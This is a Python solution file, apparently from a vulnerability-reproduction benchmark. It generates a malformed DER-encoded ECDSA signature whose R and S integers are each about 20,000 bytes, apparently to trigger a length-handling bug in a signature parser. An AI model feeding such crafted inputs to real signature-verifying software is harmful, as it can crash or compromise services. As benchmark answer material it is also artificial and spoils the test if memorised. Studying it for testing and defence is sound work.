import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Ground-truth-like DER-encoded ECDSA signature causing large R and S lengths.
        total_seq_len = 41794  # Length of SEQUENCE content (bytes after the length field)
        r_len = s_len = (total_seq_len - 8) // 2  # Each INTEGER length

        data = bytearray()

        # SEQUENCE header: 0x30 0x82 <len_hi> <len_lo>
        data.append(0x30)
        data.append(0x82)
        data.append((total_seq_len >> 8) & 0xFF)
        data.append(total_seq_len & 0xFF)

        # R INTEGER
        data.append(0x02)          # INTEGER tag
        data.append(0x82)          # long-form length, 2 bytes
        data.append((r_len >> 8) & 0xFF)
        data.append(r_len & 0xFF)
        data.extend(b"\x01" * r_len)

        # S INTEGER
        data.append(0x02)          # INTEGER tag
        data.append(0x82)          # long-form length, 2 bytes
        data.append((s_len >> 8) & 0xFF)
        data.append(s_len & 0xFF)
        data.extend(b"\x01" * s_len)

        # Ensure final size is as intended (matching given ground-truth length)
        # total length = 4 (seq header) + total_seq_len
        expected_len = 4 + total_seq_len
        if len(data) != expected_len:
            # Fallback: truncate or pad with zeros to the intended length,
            # though the arithmetic above should already make it exact.
            if len(data) > expected_len:
                data = data[:expected_len]
            else:
                data.extend(b"\x00" * (expected_len - len(data)))

        return bytes(data)
